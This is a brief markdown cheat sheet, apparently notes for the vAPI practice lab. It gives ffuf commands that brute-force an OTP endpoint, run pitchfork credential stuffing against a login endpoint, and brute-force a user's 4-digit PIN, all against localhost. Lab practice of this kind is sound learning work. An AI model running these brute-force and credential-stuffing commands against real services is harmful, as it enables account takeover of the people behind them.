# Useful things
## Split into 5 files (modify -l for different number of files)
split -l 2000 -d wordlist.txt wordlist_part

## ffuf
    ffuf -w list.txt -X POST -d '{"otp":"FUZZ"}' -H "Content-Type: application/json" -u http://localhost/vapi/api4/otp/verify --mc 200 -s

## ffuf pitchfork
    ffuf -w emails.txt:FUZZ1 -w pwds.txt:FUZZ2 -d '{"email":"FUZZ1","password":"FUZZ2"}' -X POST -H "Content-Type: application/json" -u http://localhost/vapi/api2/user/login -mc 200 -mode pitchfork

## filtering out by reponse size ffuf
    ffuf -w 4_digit_pin.txt -d '{"username":"richardbranson","pin":"FUZZ"}' -X POST -H "Content-Type: application/json" -u http://localhost/vapi/api9/v1/user/login -fs 0
